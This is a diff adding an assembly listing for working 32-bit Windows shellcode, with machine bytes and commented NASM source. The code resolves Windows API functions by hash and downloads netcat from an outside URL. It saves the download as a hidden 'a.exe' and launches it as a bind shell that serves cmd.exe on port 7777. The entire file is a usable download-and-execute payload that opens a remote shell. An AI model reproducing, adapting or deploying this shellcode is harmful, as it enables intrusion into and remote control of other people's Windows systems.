@@ -1,0 +1,350 @@
+     1                                  [BITS 32]
+     2                                  ;=============================================
+     3                                  
+     4                                  
+     5                                  section .txt
+     6                                  Start:
+     7                                  
+     8                                  ;======================download&execute===========================
+     9                                  ;make target machine download nc.exe
+    10                                  ;input:		
+    11                                  ;output:	
+    12                                  ;====================================================
+    13                                  download:
+    14                                  ;=============================================
+    15                                  ;hash for symbols in kernel32.dll
+    16                                  
+    17                                  ;======================================================================
+    18                                  download_start:
+    19                                  	;some bad characters(0x00) in data section, we replace it with 0x01, now we first change it back
+    20 00000000 EB4E                    	jmp short get_hash_address_1
+    21                                  get_hash_address:
+    22 00000002 5E                      	pop esi
+    23                                  	
+    24                                  	
+    25 00000003 31C0                    	xor eax, eax
+    26 00000005 B07C                    	mov al, 0x7c
+    27 00000007 29C4                    	sub esp, eax	;allocate 0x7c bytes of stack space
+    28 00000009 89E5                    	mov ebp, esp
+    29 0000000B 897550                  	mov [ebp + 0x50], esi			;;save kernel32_symbol_hashs address in [ebp+0x50]		
+    30                                  
+    31                                  	
+    32                                  ;=================resolve symbols and load wininet======================;
+    33 0000000E E820010000              	call find_kernel32	;put the VMA of kernel32.dll in eax
+    34 00000013 89C2                    	mov edx, eax		;move VMA of kernel32.ddl in edx
+    35                                  	
+    36 00000015 8B7550                  	mov esi, [ebp+0x50]	;put the VMA of symbols' hash in esi
+    37                                  
+    38                                  resolve_kernel32_symbols:	
+    39                                  	
+    40 00000018 8D7D04                  	lea edi, [ebp + 0x04]	;load the address of the output buffer to store the VMA of the resolved symbols into edi
+    41 0000001B 89F1                    	mov ecx, esi			;move VMA of hash in ecx
+    42 0000001D 31C0                    	xor eax, eax
+    43 0000001F B018                    	mov al, 0x18
+    44 00000021 01C1                    	add ecx, eax			;add 0x18 to ecx to signify the boundary for the last function to be resolved from kernel32.dll(6 symbols)
+    45 00000023 E8EE000000              	call resolve_symbols_for_dll
+    46                                  	
+    47                                  	
+    48                                  	
+    49                                  resolve_wininet_symbols:
+    50 00000028 31C0                    	xor eax, eax
+    51 0000002A 040C                    	add al, 0x0c
+    52 0000002C 01C1                    	add ecx, eax			;3 symbols
+    53 0000002E B8016E6574              	mov eax, 0x74656e01		;set eax to 'net', 0x01
+    54 00000033 C1F808                  	sar eax, 0x08			;eax='net':shift eax 2 bytes to the right to eliminate 0x01 and put 0x00 in the highest byte of eax
+    55 00000036 50                      	push eax				;push 'net' into stack
+    56 00000037 B877696E69              	mov eax, 0x696e6977
+    57 0000003C 50                      	push eax				;push 'wini' into stack
+    58 0000003D 89E3                    	mov ebx, esp			;ebx is the pointer to the null-terminated 'wininet' string
+    59 0000003F 51                      	push ecx
+    60 00000040 52                      	push edx
+    61 00000041 53                      	push ebx				;push pointer to 'wininet' string as the first argument to LoadLibraryA
+    62 00000042 FF5504                  	call dword [ebp + 0x04]		;call LoadLibraryA and map wininet.dll into process space
+    63 00000045 5A                      	pop edx					;restore edx
+    64 00000046 59                      	pop ecx					;restore ecd
+    65 00000047 89C2                    	mov edx, eax			;set edx to wininet's address
+    66 00000049 E8C8000000              	call resolve_symbols_for_dll	;resolve symbols of the functions in wininet.dll
+    67                                  ;=================resolve symbols and load wininet======================;
+    68                                  
+    69 0000004E EB02                    jmp short get_hash_address_1_skip
+    70                                  get_hash_address_1:
+    71 00000050 EB47                    	jmp short get_hash_address_2
+    72                                  get_hash_address_1_skip:
+    73                                  
+    74                                  
+    75                                  ;===================get handle==================================;
+    76                                  internet_open:
+    77 00000052 31C0                    	xor eax, eax
+    78 00000054 50                      	push eax						;push dwFlags
+    79 00000055 50                      	push eax						;push lpszProxyBypass
+    80 00000056 50                      	push eax						;push lpszProxyName	
+    81 00000057 50                      	push eax						;push dwAccessType
+    82 00000058 50                      	push eax						;push lpszAgent
+    83 00000059 FF551C                  	call dword [ebp + 0x1c]				;call internetOpenA to create and internet handle for use with InternetOpenUrlA
+    84 0000005C 894534                  	mov [ebp + 0x34], eax			;save the handle returned from InternetOpenA for later use
+    85                                  internet_open_url:
+    86 0000005F 31C0                    	xor eax, eax
+    87 00000061 50                      	push eax						;push dwContext
+    88 00000062 50                      	push eax						;push dwFlags
+    89 00000063 50                      	push eax						;push dwHeadersLength
+    90 00000064 50                      	push eax						;push lpszHeaders
+    91 00000065 31DB                    	xor ebx, ebx
+    92 00000067 B345                    	mov bl, 0x45
+    93 00000069 035D50                  	add ebx, [ebp + 0x50]							;load the address of the URL to ebx
+    94 0000006C 53                      	push ebx						;push address of the URL
+    95 0000006D FF7534                  	push dword [ebp + 0x34]				;push handle return from InternetOpenA
+    96 00000070 FF5520                  	call dword [ebp + 0x20]				;call InternetOpenUrlA
+    97 00000073 894538                  	mov [ebp + 0x38], eax			;save the handle returned from InternetOpenUrlA for later use
+    98                                  ;===================get handle==================================;
+    99                                  
+   100                                  ;===================create file=================================;
+   101                                  create_file:
+   102                                  	
+   103 00000076 31C0                    	xor eax, eax
+   104 00000078 50                      	push eax					;push gTemplateFile
+   105 00000079 B082                    	mov al, 0x82
+   106 0000007B 50                      	push eax					;push FILE_ATTRIBUTE_NORMAL&FILE_ATTRIBUTE_HIDDEN
+   107 0000007C B002                    	mov al, 0x02				;set al = CREATE_ALWAYS
+   108 0000007E 50                      	push eax					;push dwCreationDisposition
+   109 0000007F 30C0                    	xor al, al
+   110 00000081 50                      	push eax					;push lpSecurityAttribute
+   111 00000082 50                      	push eax					;push dwShareMode
+   112 00000083 B040                    	mov al, 0x40				;set al = GENERIC_WRITE
+   113 00000085 C1E018                  	sal eax, 0x18
+   114 00000088 50                      	push eax					;push dwDesiredAccess
+   115 00000089 31C0                    	xor eax, eax
+   116 0000008B B024                    	mov al, 0x24
+   117 0000008D 034550                  	add eax, [ebp + 0x50]
+   118 00000090 50                      	push eax					;push pointer to 'a.exe' as lpFileName
+   119 00000091 FF5508                  	call dword [ebp + 0x08]			;call CreateFile to create a.exe as hiddern file and open it with write permission
+   120 00000094 89453C                  	mov [ebp + 0x3c], eax		;save the file handle for later use
+   121                                  ;===================create file=================================;
+   122                                  
+   123 00000097 EB02                    jmp short get_hash_address_2_skip
+   124                                  get_hash_address_2:
+   125 00000099 EB4D                    	jmp short get_hash_address_3
+   126                                  get_hash_address_2_skip:
+   127                                  
+   128                                  
+   129                                  ;===================download====================================;
+   130                                  download_begin:
+   131 0000009B 31C0                    	xor eax, eax
+   132 0000009D 66B80C01                	mov ax, 0x010c
+   133 000000A1 29C4                    	sub esp, eax				;allocate 268 bytes of stack space
+   134 000000A3 89E6                    	mov esi, esp
+   135                                  download_loop:
+   136 000000A5 8D5E04                  	lea ebx, [esi + 0x04]		;4 bytes offset from stack frame pointer, this location will hold the number of bytes read from the wire
+   137 000000A8 53                      	push ebx					;push pointer as lpdwNumberOfBytesRead
+   138 000000A9 66B80401                	mov ax, 0x0104				;set eax=260
+   139 000000AD 50                      	push eax					;push dwNumberOfBytesToRead
+   140 000000AE 8D4608                  	lea eax, [esi + 0x08]		;set the point 8 bytes offset from stack frame pointer, which is used as the buffer for storaging the read
+   141 000000B1 50                      	push eax					;push lpBuffer
+   142 000000B2 FF7538                  	push dword [ebp + 0x38]			;push hFile returned from InternetOpenUrlA
+   143 000000B5 FF5524                  	call dword [ebp + 0x24]			;call InternetReadFile
+   144 000000B8 8B4604                  	mov eax, [esi + 0x04]		;move the number of bytes actually read into eax
+   145 000000BB 85C0                    	test eax, eax				;judge if the file has been reached
+   146 000000BD 7419                    	jz download_finished
+   147                                  download_write_file:
+   148 000000BF 31C0                    	xor eax, eax
+   149 000000C1 50                      	push eax					;push lpOverlapped
+   150 000000C2 8D4604                  	lea eax, [esi + 0x04]
+   151 000000C5 50                      	push eax					;push lpdwNumberOfBytesRead(pointer to hold the number of bytes)
+   152 000000C6 FF7604                  	push dword [esi + 0x04]			;push nNumberOfBytesToWrite(the number of bytes that were read from the wire)
+   153 000000C9 8D4608                  	lea eax, [esi + 0x08]		;load the address of the buffer that was read into from the wire
+   154 000000CC 50                      	push eax					;push lpBuffer
+   155 000000CD FF753C                  	push dword [ebp + 0x3c]			;push the handle to the file that was returned from CreateFile
+   156 000000D0 FF550C                  	call dword [ebp + 0x0c]			;call WriteFile to write the data read from the wire to the file
+   157 000000D3 E9CDFFFFFF              	jmp download_loop			;continue downloading
+   158                                  download_finished:
+   159 000000D8 FF753C                  	push dword [ebp + 0x3c]			;push the handle to the file
+   160 000000DB FF5510                  	call dword [ebp + 0x10]			;call closeHandle
+   161 000000DE 31C0                    	xor eax, eax
+   162 000000E0 66B80C01                	mov ax, 0x010c
+   163 000000E4 01C4                    	add esp, eax				;restore stack size
+   164                                  ;===================download====================================;
+   165                                  
+   166                                  
+   167 000000E6 EB02                    jmp short get_hash_address_3_skip
+   168                                  get_hash_address_3:
+   169 000000E8 EB47                    	jmp short get_hash_address_4
+   170                                  get_hash_address_3_skip:
+   171                                  
+   172                                  
+   173                                  ;====================start process=============================;
+   174                                  initialize_process:
+   175 000000EA 31C9                    	xor ecx, ecx
+   176 000000EC B154                    	mov cl, 0x54			;size of STARTUPINFO&PROCESS_INFORMATION structure
+   177 000000EE 29CC                    	sub esp, ecx			;allocate 0x54 bytes of stack space
+   178 000000F0 89E7                    	mov edi, esp
+   179                                  zero_structs:
+   180 000000F2 31C0                    	xor eax, eax
+   181 000000F4 F3AA                    	rep stosb				;repeat storing 0 at [edi] until ecx is 0
+   182                                  initialize_structs:
+   183 000000F6 89E7                    	mov edi, esp
+   184 000000F8 C60744                  	mov byte [edi], 0x44	;set the cb attribute of STARTUPINFO to the size of the structure(0x44)
+   185                                  execute_process:
+   186 000000FB 8D7744                  	lea esi, [edi + 0x44]		;load the address of the PROCESS_INFORMATION structure into esi
+   187 000000FE 56                      	push esi					;push lpProcessInformation
+   188 000000FF 57                      	push edi					;push lpStartupInfo
+   189 00000100 50                      	push eax					;push lpCurrentDirectory
+   190 00000101 50                      	push eax					;push lpEnvironment
+   191 00000102 50                      	push eax					;push dwCreationFlags
+   192 00000103 50                      	push eax					;push bInheritHandles
+   193 00000104 50                      	push eax					;push ThreadAttributes
+   194 00000105 50                      	push eax					;push lpProcessAttribute
+   195 00000106 31DB                    	xor ebx, ebx
+   196 00000108 B32A                    	mov bl, 0x2A
+   197 0000010A 035D50                  	add ebx, [ebp+0x50]
+   198 0000010D 53                      	push ebx					;push lpCommandLine(pointer to cmd)
+   199 0000010E 50                      	push eax					;push lpApplicationName
+   200 0000010F FF5514                  	call dword [ebp + 0x14]			;call createProcess
+   201                                  exit_process:
+   202 00000112 FF5518                  	call dword [ebp + 0x18]			;call exitProcess
+   203 00000115 C3                      	ret
+   204                                  	
+   205                                  ;====================================================
+   206                                  
+   207                                  
+   208                                  
+   209                                  ;====================================================
+   210                                  ;resolve symbols within dll
+   211                                  ;input:		load the function's hash at esi, edx(dll's address)
+   212                                  ;output:	
+   213                                  ;====================================================
+   214                                  resolve_symbols_for_dll:
+   215 00000116 AD                      	lodsd		;load esi to eax, add 0x04 to esi
+   216 00000117 50                      	push eax	;push function's hash
+   217 00000118 52                      	push edx	;push dll's address
+   218 00000119 E840000000              	call find_function	;resolve the function's address
+   219 0000011E 8907                    	mov [edi], eax	;store the function's addre in [edi]
+   220 00000120 31C0                    	xor eax, eax
+   221 00000122 0408                    	add al, 0x08
+   222 00000124 01C4                    	add esp, eax	;restore 8 bytes to the stack for the two arguments(eax, edx)
+   223 00000126 2C04                    	sub al, 0x04
+   224 00000128 01C7                    	add edi, eax	;add 0x04 to edi, make edi available for next function's address output
+   225 0000012A 39CE                    	cmp esi, ecx	;check if compare all the function's hash
+   226 0000012C 75E8                    	jne resolve_symbols_for_dll
+   227                                  resolve_symbols_for_dll_finished:
+   228 0000012E C3                      	ret
+   229                                  ;====================================================
+   230                                  
+   231 0000012F EB02                    jmp short get_hash_address_4_skip
+   232                                  get_hash_address_4:
+   233 00000131 EB29                    	jmp short get_hash_address_5
+   234                                  get_hash_address_4_skip:
+   235                                  	
+   236                                  ;======================find_kernel32==========================
+   237                                  ;find kernel32.dll	(PEB method)
+   238                                  ;input:		none
+   239                                  ;output:	eax(kernel32.dll's address)
+   240                                  ;====================================================
+   241                                  find_kernel32:
+   242 00000133 56                      	push esi
+   243 00000134 31C0                    	xor eax, eax
+   244 00000136 648B4030                	mov eax, [fs:eax+0x30]	;get the PEB Pointer
+   245 0000013A 85C0                    	test eax, eax
+   246 0000013C 7811                    	js find_kernel32_9x
+   247                                  find_kernel32_nt:
+   248 0000013E 8B400C                  	mov eax, [eax + 0x0c]	;get the Module list Pointer
+   249 00000141 8B701C                  	mov esi, [eax + 0x1c]	;get InloadOrderModuleList Pointer
+   250 00000144 AD                      	lodsd					;load every from InloadOrderModuleList
+   251 00000145 8B4008                  	mov eax, [eax + 0x8]	;get the send entry(kernel32.dll's address)
+   252 00000148 31DB                    	xor ebx, ebx
+   253 0000014A E909000000              	jmp find_kernel32_finished
+   254                                  find_kernel32_9x:
+   255 0000014F 8B4034                  	mov eax, [eax + 0x34]
+   256 00000152 8D407C                  	lea eax, [eax + 0x7c]
+   257 00000155 8B403C                  	mov eax, [eax + 0x3c]
+   258                                  find_kernel32_finished:
+   259 00000158 5E                      	pop esi
+   260 00000159 C3                      	ret
+   261                                  ;======================find_kernel32==========================
+   262                                  
+   263                                  
+   264 0000015A EB02                    jmp short get_hash_address_5_skip
+   265                                  get_hash_address_5:
+   266 0000015C EB51                    	jmp short kernel32_symbol_hashs
+   267                                  get_hash_address_5_skip:
+   268                                  
+   269                                  
+   270                                  ;=======================find_function=========================
+   271                                  ;find function with hash
+   272                                  ;input:		push hash of the function's name and dll's address before call this function
+   273                                  ;output:	eax(address of the function)
+   274                                  ;====================================================
+   275                                  find_function:
+   276 0000015E 60                      	pushad
+   277 0000015F 8B6C2424                	mov ebp, [esp + 0x24]	;put dll's address in ebp
+   278 00000163 8B453C                  	mov eax, [ebp + 0x3c]	;put PE header in eax
+   279 00000166 8B540578                	mov edx, [ebp + eax + 0x78]	;put export table in edx
+   280 0000016A 01EA                    	add edx, ebp			;make the the export table address absolute by adding the dll's address
+   281 0000016C 8B4A18                  	mov ecx, [edx + 0x18]	;extract the number of exported items
+   282 0000016F 8B5A20                  	mov ebx, [edx + 0x20]	;extract the names table relative offset
+   283 00000172 01EB                    	add ebx, ebp			;make the names table address absolute storing in ebp
+   284                                  	
+   285                                  	;the true process of finding address of the function
+   286                                  find_function_loop:
+   287 00000174 E337                    	jecxz find_function_finished
+   288 00000176 49                      	dec ecx
+   289 00000177 8B348B                  	mov esi, [ebx + ecx * 4]
+   290 0000017A 01EE                    	add esi, ebp
+   291                                  compute_hash:
+   292 0000017C 31FF                    	xor edi, edi
+   293 0000017E 31C0                    	xor eax, eax
+   294 00000180 FC                      	cld
+   295                                  compute_hash_again:
+   296 00000181 AC                      	lodsb
+   297 00000182 84C0                    	test al, al
+   298 00000184 740A                    	jz compute_hash_finished
+   299 00000186 C1CF0D                  	ror edi, 0xd
+   300 00000189 01C7                    	add edi, eax
+   301 0000018B E9F1FFFFFF              	jmp compute_hash_again
+   302                                  compute_hash_finished:
+   303                                  find_function_compare:
+   304 00000190 3B7C2428                	cmp edi, [esp + 0x28]
+   305 00000194 75DE                    	jnz find_function_loop
+   306 00000196 8B5A24                  	mov ebx, [edx + 0x24]
+   307 00000199 01EB                    	add ebx, ebp
+   308 0000019B 668B0C4B                	mov cx, [ebx + 2 * ecx]
+   309 0000019F 8B5A1C                  	mov ebx, [edx + 0x1c]
+   310 000001A2 01EB                    	add ebx, ebp
+   311 000001A4 8B048B                  	mov eax, [ebx + 4 * ecx]
+   312 000001A7 01E8                    	add eax, ebp		;make the function's address absolute
+   313 000001A9 8944241C                	mov [esp + 0x1c], eax	;Overwrite the stack copy of the preserved eax register so that when popad is finished the appropriate return value will be set.
+   314                                  find_function_finished:
+   315 000001AD 61                      	popad
+   316 000001AE C3                      	ret
+   317                                  ;=======================find_function=========================
+   318                                  
+   319                                  ;============================================================
+   320                                  kernel32_symbol_hashs:
+   321 000001AF E84EFEFFFF              	call dword get_hash_address
+   322                                  	;LoadLibraryA
+   323 000001B4 8E4E0EEC                    db 0x8e, 0x4e, 0x0e, 0xec
+   324                                  	;CreateFile
+   325 000001B8 A517007C                	db 0xa5, 0x17, 0x00, 0x7c
+   326                                  	;WriteFile
+   327 000001BC 1F790AE8                	db 0x1f, 0x79, 0x0a, 0xe8
+   328                                  	;CloseHandle
+   329 000001C0 FB97FD0F                	db 0xfb, 0x97, 0xfd, 0x0f
+   330                                      ;CreateProcessA
+   331 000001C4 72FEB316                    db 0x72, 0xfe, 0xb3, 0x16
+   332                                      ;ExitProcess 0x18
+   333 000001C8 7ED8E273                    db 0x7e, 0xd8, 0xe2, 0x73
+   334                                  wininet_symbol_hashes:
+   335                                  	;InternetOpenA 0x1c
+   336 000001CC 2944E857                	db 0x29, 0x44, 0xe8, 0x57
+   337                                  	;InternetOpenUrl 0x20
+   338 000001D0 49ED0F7E                	db 0x49, 0xed, 0x0f, 0x7e
+   339                                  	;InternetReadFile
+   340 000001D4 8B4BE35F                	db 0x8b, 0x4b, 0xe3, 0x5f
+   341 000001D8 612E65786500            file: db "a.exe", 0x00
+   342 000001DE 612E657865202D6520-     cmd: db "a.exe -e cmd.exe -l -p 7777"
+   343 000001E7 636D642E657865202D-
+   344 000001F0 6C202D702037373737 
+   345                                  nc_url:
+   346 000001F9 687474703A2F2F7777-     db 'http://www.thaoh.net/Tools/Netcat/dl/nc.exe', 0x00
+   347 00000202 772E7468616F682E6E-
+   348 0000020B 65742F546F6F6C732F-
+   349 00000214 4E65746361742F646C-
+   350 0000021D 2F6E632E65786500   
